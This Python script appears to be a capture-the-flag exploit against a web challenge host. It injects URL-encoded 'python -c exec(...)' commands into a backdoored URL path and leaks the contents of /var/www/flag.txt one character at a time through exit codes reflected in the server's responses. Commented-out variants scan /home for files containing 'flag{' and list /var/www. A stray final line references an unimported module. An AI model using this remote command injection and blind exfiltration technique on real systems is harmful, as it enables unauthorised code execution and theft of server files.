import requests


def force_req(url):
    try:
        return requests.get(url, timeout=1000)
    except requests.exceptions.ReadTimeout:
        return force_req(url)


counter = 0
while True:
    request_0 = "import os\\nimport sys\\ncounter = "
    # request_1 = "\\nfor (dirpath, dirnames, filenames) in os.walk(\\'/home\\'):\\n\\tfor fname in filenames:\\n\\t\\tif fname == \\'backdoor.c\\':\\n\\t\\t\\texit(6)\\n\\t\\ttry:\\n\\t\\t\\twith open(os.path.join(dirpath, fname), \\'r\\') as f:\\n\\t\\t\\t\\tfbody = f.read()\\n\\t\\t\\t\\tif \\'flag{\\' in fbody:\\n\\t\\t\\t\\t\\texit(ord(fbody[fbody.index(\\'flag{\\') + 5:][counter]))\\n\\t\\texcept IOError:\\n\\t\\t\\tpass\\nexit(5)"
    # request_1 = "\\nexit(ord(\\' \\'.join(os.listdir(\\'/var/www\\'))[counter]))"
    request_1 = "\\nwith open(\\'/var/www/flag.txt\\', \\'r\\') as f:\\n\\t exit(ord(f.read()[counter]))"
    request = request_0 + str(counter) + request_1
    request = 'python -c \"exec(\'{}\')\"'.format(request)
    # print(repr(request.replace('_', ' ')))
    # print(os.system(request) >> 8)
    request = request.replace('\\', '%5C')
    request = request.replace(' ', '_')
    request = request.replace('+', '%2B')
    url = 'https://indianer.flatearth.fluxfingers.net/index.html/dpdpdpamamamamajvjvjvjvgsgsgsgsgpdp=' + request + '_%23'
    reset = 'https://indianer.flatearth.fluxfingers.net/index.html'

    chr_resp = 0
    while chr_resp == 0 or chr_resp == 2:
        r = force_req(url)
        while 'Not Found' not in r.text or 'dpdpdpamamamam' in r.text:
            print('retry')
            r = force_req(url)

        res = r.text
        chr_resp = ord(res[res.index('ndex') - 1]) - ord('i')
        print('retry', chr_resp)
    print('real_num', chr_resp)
    try:
        print('real', chr(chr_resp))
    except:
        print('real', 'unprintable')

    requests.get(reset)
    counter += 1


    exit(ord(''.join(os.listdir('/var/www'))[counter]))
